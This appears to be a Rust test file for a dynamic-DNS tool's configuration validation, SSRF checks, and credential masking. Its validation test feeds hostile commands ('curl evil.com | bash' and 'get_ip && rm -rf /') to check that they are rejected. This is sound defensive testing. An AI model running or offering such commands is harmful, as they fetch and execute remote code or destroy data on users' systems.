use super::*;
use crate::config::model::DnsTaskConfig;
use std::collections::HashMap;
use std::sync::Arc;

#[test]
fn test_password_hash_not_serialized_when_empty() {
    let auth = UserAuthConfig {
        username: "admin".to_string(),
        password_hash: String::new(),
    };

    let json_str = serde_json::to_string(&auth).unwrap();
    assert!(!json_str.contains("password_hash"));
    assert_eq!(json_str, r#"{"username":"admin"}"#);
}

#[test]
fn test_task_enabled_serialization() {
    let toml_str = r#"
name = "测试已禁用任务"
enabled = false

[provider]
type = "cloudflare"

[ipv4]
enabled = true
source_type = "url"
domains = ["test.example.com"]
"#;
    let task: DnsTaskConfig = toml::from_str(toml_str).unwrap();
    assert!(!task.enabled);

    let default_toml = r#"
name = "测试默认启用任务"

[provider]
type = "cloudflare"
"#;
    let task_default: DnsTaskConfig = toml::from_str(default_toml).unwrap();
    assert!(task_default.enabled);
}

#[tokio::test]
async fn test_save_config_validation_rules() {
    let mut valid_task = DnsTaskConfig::default();
    valid_task.ipv4.url_endpoints = vec!["https://1.1.1.1/ip".to_string()];
    valid_task.ipv6.url_endpoints = vec![];
    let valid_config = AppConfig {
        dns_tasks: vec![valid_task],
        ..Default::default()
    };

    // 校验合法配置
    assert!(valid_config.validate().is_ok());
    assert!(validate_task_ssrf(&valid_config.dns_tasks).await.is_ok());

    // 校验非法配置条件：检查间隔太小
    let mut invalid_interval = valid_config.clone();
    invalid_interval.interval_secs = 4;
    assert!(invalid_interval.validate().is_err());

    // 强制校对次数为 0
    let mut invalid_cache = valid_config.clone();
    invalid_cache.cache_times = 0;
    assert!(invalid_cache.validate().is_err());

    // 监听端口为 0
    let mut invalid_port = valid_config.clone();
    invalid_port.listen_port = 0;
    assert!(invalid_port.validate().is_err());

    // 空任务名
    let mut invalid_task_name = valid_config.clone();
    invalid_task_name.dns_tasks[0].name = "  ".to_string();
    assert!(invalid_task_name.validate().is_err());

    // 校验重复任务名称
    let mut duplicate_tasks = valid_config.clone();
    duplicate_tasks.dns_tasks = vec![
        DnsTaskConfig {
            name: "默认任务".to_string(),
            ..Default::default()
        },
        DnsTaskConfig {
            name: "默认任务".to_string(),
            ..Default::default()
        },
    ];
    assert!(duplicate_tasks.validate().is_err());

    // 校验非法的 URL 端点协议
    let mut invalid_url_tasks = valid_config.clone();
    invalid_url_tasks.dns_tasks[0].ipv4.source_type = crate::config::model::IpSourceType::Url;
    invalid_url_tasks.dns_tasks[0].ipv4.url_endpoints = vec!["ftp://example.com/ip".to_string()];
    assert!(invalid_url_tasks.validate().is_err());

    // 校验非法的通知服务 URL 协议
    let invalid_notif_config = AppConfig {
        notifications: NotificationConfig {
            bark: Some(crate::config::model::BarkConfig {
                enabled: true,
                server_url: "ftp://bark.day.app".to_string(),
                device_key: "k".to_string(),
                group: None,
                sound: None,
            }),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(invalid_notif_config.validate().is_err());
    assert!(
        validate_notification_urls(&invalid_notif_config.notifications)
            .await
            .is_err()
    );

    // 校验命令提取 IP 的 Shell 注入防范与非空限制
    let mut dangerous_cmd_task = valid_config.clone();
    dangerous_cmd_task.dns_tasks[0].ipv4.source_type = crate::config::model::IpSourceType::Command;
    dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("curl evil.com | bash".to_string());
    assert!(dangerous_cmd_task.validate().is_err());

    dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("get_ip && rm -rf /".to_string());
    assert!(dangerous_cmd_task.validate().is_err());

    dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("   ".to_string());
    assert!(dangerous_cmd_task.validate().is_err());

    dangerous_cmd_task.dns_tasks[0].ipv4.cmd = None;
    assert!(dangerous_cmd_task.validate().is_err());

    // 安全独立命令允许通过
    dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("/usr/local/bin/get_my_ip --v4".to_string());
    assert!(dangerous_cmd_task.validate().is_ok());

    // 校验 Callback Provider 的 SSRF 与危险标头拦截 (P-4/P-8)
    let mut callback_task = valid_config.clone();
    callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
        url: "http://127.0.0.1:8080/hook".to_string(),
        method: "POST".to_string(),
        headers: None,
        body: None,
    };
    // 静态校验通过合法的 http:// 协议
    assert!(callback_task.validate().is_ok());
    // 异步 SSRF 校验成功拦截私网目标
    assert!(validate_task_ssrf(&callback_task.dns_tasks).await.is_err());

    // 拦截非白名单的危险 HTTP 方法 (如 TRACE)
    callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
        url: "https://1.1.1.1/hook".to_string(),
        method: "TRACE".to_string(),
        headers: None,
        body: None,
    };
    assert!(callback_task.validate().is_err());

    // 拦截敏感请求头 (如 Host 篡改)
    let mut dangerous_headers = HashMap::new();
    dangerous_headers.insert("Host".to_string(), "internal.service".to_string());
    callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
        url: "https://1.1.1.1/hook".to_string(),
        method: "POST".to_string(),
        headers: Some(dangerous_headers),
        body: None,
    };
    assert!(callback_task.validate().is_err());

    // 拦截超过 64KB 的超大请求体
    callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
        url: "https://1.1.1.1/hook".to_string(),
        method: "POST".to_string(),
        headers: None,
        body: Some("a".repeat(65537)),
    };
    assert!(callback_task.validate().is_err());

    // 合法公网 Callback 配置应通过全部校验
    callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
        url: "https://1.1.1.1/hook?ip=#{ip}".to_string(),
        method: "POST".to_string(),
        headers: Some(HashMap::from([(
            "Authorization".to_string(),
            "Bearer token".to_string(),
        )])),
        body: Some(r##"{"ip": "#{ip}"}"##.to_string()),
    };
    assert!(callback_task.validate().is_ok());
    assert!(validate_task_ssrf(&callback_task.dns_tasks).await.is_ok());
}

#[tokio::test]
async fn test_save_config_preserves_auth() {
    let (tx, _rx) = tokio::sync::mpsc::channel(1);
    let dir = tempfile::tempdir().unwrap();
    let config_file = dir.path().join("config_save_test.toml");
    let manager =
        Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());

    // 设置初始管理员凭据
    manager
        .update_config(AppConfig {
            auth: Some(UserAuthConfig {
                username: "admin".to_string(),
                password_hash: "$2b$12$test_existing_hash".to_string(),
            }),
            ..Default::default()
        })
        .unwrap();

    let state = AppState {
        config_manager: manager.clone(),
        trigger_sender: tx,
        log_buffer: crate::util::logging::LogBuffer::new(10),
        state_manager: crate::core::state::StateManager::new(),
        cancel_token: tokio_util::sync::CancellationToken::new(),
        active_listen_port: 9876,
        active_not_allow_wan_access: true,
    };

    // 模拟前端保存配置请求（未附带 auth 字段）
    let app_cfg = AppConfig {
        interval_secs: 10,
        cache_times: 5,
        listen_port: 9876,
        auth: None, // 前端未提交 auth 字段
        dns_tasks: vec![],
        ..Default::default()
    };
    let payload = SaveConfigRequest {
        config: app_cfg.into(),
        new_password: None,
    };

    let res = save_config_handler(axum::extract::State(state), axum::Json(payload)).await;
    assert!(res.is_ok());

    // 验证旧管理员凭据未丢失
    let current = manager.get_config();
    assert!(current.auth.is_some());
    let auth = current.auth.as_ref().unwrap();
    assert_eq!(auth.username, "admin");
    assert_eq!(auth.password_hash, "$2b$12$test_existing_hash");
}

#[tokio::test]
async fn test_save_config_rejects_modifying_listen_port() {
    let (tx, _rx) = tokio::sync::mpsc::channel(1);
    let dir = tempfile::tempdir().unwrap();
    let config_file = dir.path().join("config_reject_port_test.toml");
    let manager =
        Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());

    let state = AppState {
        config_manager: manager.clone(),
        trigger_sender: tx,
        log_buffer: crate::util::logging::LogBuffer::new(10),
        state_manager: crate::core::state::StateManager::new(),
        cancel_token: tokio_util::sync::CancellationToken::new(),
        active_listen_port: 9876,
        active_not_allow_wan_access: true,
    };

    let app_cfg = AppConfig {
        listen_port: 8888, // 试图篡改监听端口
        ..Default::default()
    };
    let payload = SaveConfigRequest {
        config: app_cfg.into(),
        new_password: None,
    };

    let res = save_config_handler(axum::extract::State(state), axum::Json(payload)).await;
    assert!(res.is_err());
    let err = res.unwrap_err();
    assert_eq!(err.status, axum::http::StatusCode::BAD_REQUEST);
    assert!(err.message.contains("Web 服务监听端口"));
}

#[tokio::test]
async fn test_save_config_rejects_modifying_not_allow_wan_access() {
    let (tx, _rx) = tokio::sync::mpsc::channel(1);
    let dir = tempfile::tempdir().unwrap();
    let config_file = dir.path().join("config_reject_wan_test.toml");
    let manager =
        Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());

    let state = AppState {
        config_manager: manager.clone(),
        trigger_sender: tx,
        log_buffer: crate::util::logging::LogBuffer::new(10),
        state_manager: crate::core::state::StateManager::new(),
        cancel_token: tokio_util::sync::CancellationToken::new(),
        active_listen_port: 9876,
        active_not_allow_wan_access: true,
    };

    // 原默认 not_allow_wan_access 为 true，尝试篡改为 false
    let app_cfg = AppConfig {
        not_allow_wan_access: false,
        ..Default::default()
    };
    let payload = SaveConfigRequest {
        config: app_cfg.into(),
        new_password: None,
    };

    let res = save_config_handler(axum::extract::State(state), axum::Json(payload)).await;
    assert!(res.is_err());
    let err = res.unwrap_err();
    assert_eq!(err.status, axum::http::StatusCode::BAD_REQUEST);
    assert!(err.message.contains("not_allow_wan_access"));
}

#[tokio::test]
async fn test_get_config_handler_restart_required_detection() {
    let (tx, _rx) = tokio::sync::mpsc::channel(1);
    let dir = tempfile::tempdir().unwrap();
    let config_file = dir.path().join("config_restart_test.toml");
    let manager =
        Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());

    // 模拟运行时活跃状态与当前文件配置不一致（例如通过命令行临时覆盖启动）
    let state = AppState {
        config_manager: manager.clone(),
        trigger_sender: tx,
        log_buffer: crate::util::logging::LogBuffer::new(10),
        state_manager: crate::core::state::StateManager::new(),
        cancel_token: tokio_util::sync::CancellationToken::new(),
        active_listen_port: 7777,           // 运行时与配置文件 9876 不一致
        active_not_allow_wan_access: false, // 运行时与配置文件 true 不一致
    };

    let response = get_config_handler(axum::extract::State(state))
        .await
        .into_response();
    assert_eq!(response.status(), axum::http::StatusCode::OK);

    // 读取响应 Body
    let body_bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body_bytes).unwrap();
    assert!(json["success"].as_bool().unwrap());

    let restart_req = json["data"]["restart_required"]
        .as_array()
        .unwrap()
        .iter()
        .map(|v| v.as_str().unwrap().to_string())
        .collect::<Vec<_>>();
    assert!(restart_req.contains(&"listen_port".to_string()));
    assert!(restart_req.contains(&"not_allow_wan_access".to_string()));
}

#[test]
fn test_credential_masking_and_restoration() {
    use crate::config::model::CREDENTIAL_MASK;
    use crate::config::model::notification::*;
    use crate::config::model::provider::ProviderConfig;

    let original_config = AppConfig {
        auth: Some(UserAuthConfig {
            username: "admin".to_string(),
            password_hash: "$2b$12$secret_hash".to_string(),
        }),
        dns_tasks: vec![
            DnsTaskConfig {
                name: "AliDns Task".to_string(),
                provider: ProviderConfig::AliDns {
                    access_key_id: "LTAI_real_id".to_string(),
                    access_key_secret: "real_secret_123".to_string(),
                    endpoint: None,
                },
                ..Default::default()
            },
            DnsTaskConfig {
                name: "Cloudflare Task".to_string(),
                provider: ProviderConfig::Cloudflare {
                    api_token: Some("cf_token_abc".to_string()),
                    api_key: None,
                    email: None,
                },
                ..Default::default()
            },
        ],
        notifications: NotificationConfig {
            telegram: Some(TelegramConfig {
                enabled: true,
                bot_token: "tg_bot_token_xyz".to_string(),
                chat_id: "123456".to_string(),
                api_proxy: None,
            }),
            email: Some(EmailConfig {
                enabled: true,
                smtp_server: "smtp.example.com".to_string(),
                smtp_port: 465,
                use_ssl: true,
                username: "user@example.com".to_string(),
                password: "smtp_password_999".to_string(),
                from_address: "user@example.com".to_string(),
                to_addresses: vec!["admin@example.com".to_string()],
            }),
            ..Default::default()
        },
        ..Default::default()
    };

    // 1. 测试脱敏逻辑：下发前端时所有凭据被掩码为 ******
    let mut masked = original_config.clone();
    masked.mask_credentials();

    // 密码哈希被清空
    assert!(masked.auth.as_ref().unwrap().password_hash.is_empty());
    // 非敏感 ID 保持不变
    assert_eq!(
        match &masked.dns_tasks[0].provider {
            ProviderConfig::AliDns { access_key_id, .. } => access_key_id.as_str(),
            _ => panic!(),
        },
        "LTAI_real_id"
    );
    // 敏感密钥全部变为掩码
    assert_eq!(
        match &masked.dns_tasks[0].provider {
            ProviderConfig::AliDns {
                access_key_secret, ..
            } => access_key_secret.as_str(),
            _ => panic!(),
        },
        CREDENTIAL_MASK
    );
    assert_eq!(
        match &masked.dns_tasks[1].provider {
            ProviderConfig::Cloudflare { api_token, .. } => api_token.as_deref().unwrap(),
            _ => panic!(),
        },
        CREDENTIAL_MASK
    );
    assert_eq!(
        masked.notifications.telegram.as_ref().unwrap().bot_token,
        CREDENTIAL_MASK
    );
    assert_eq!(
        masked.notifications.email.as_ref().unwrap().password,
        CREDENTIAL_MASK
    );

    // 2. 测试保存恢复逻辑：前端原样提交带掩码的配置时，无缝还原旧密钥
    let mut submitted_from_frontend = masked.clone();
    // 用户改了任务名称，但未改动密钥输入框 (仍为 ******)
    submitted_from_frontend.dns_tasks[0].name = "Updated AliDns Task".to_string();
    // 用户在第 2 个任务中输入了全新的 token
    submitted_from_frontend.dns_tasks[1].provider = ProviderConfig::Cloudflare {
        api_token: Some("new_brand_new_token_456".to_string()),
        api_key: None,
        email: None,
    };

    submitted_from_frontend.restore_masked_credentials(&original_config);

    // 验证任务 1 的密钥被正确还原
    assert_eq!(
        match &submitted_from_frontend.dns_tasks[0].provider {
            ProviderConfig::AliDns {
                access_key_secret, ..
            } => access_key_secret.as_str(),
            _ => panic!(),
        },
        "real_secret_123"
    );
    // 验证任务 2 的新密钥成功保存，未被旧密钥冲掉
    assert_eq!(
        match &submitted_from_frontend.dns_tasks[1].provider {
            ProviderConfig::Cloudflare { api_token, .. } => api_token.as_deref().unwrap(),
            _ => panic!(),
        },
        "new_brand_new_token_456"
    );
    // 验证通知渠道的旧密钥成功还原
    assert_eq!(
        submitted_from_frontend
            .notifications
            .telegram
            .as_ref()
            .unwrap()
            .bot_token,
        "tg_bot_token_xyz"
    );
    assert_eq!(
        submitted_from_frontend
            .notifications
            .email
            .as_ref()
            .unwrap()
            .password,
        "smtp_password_999"
    );
}
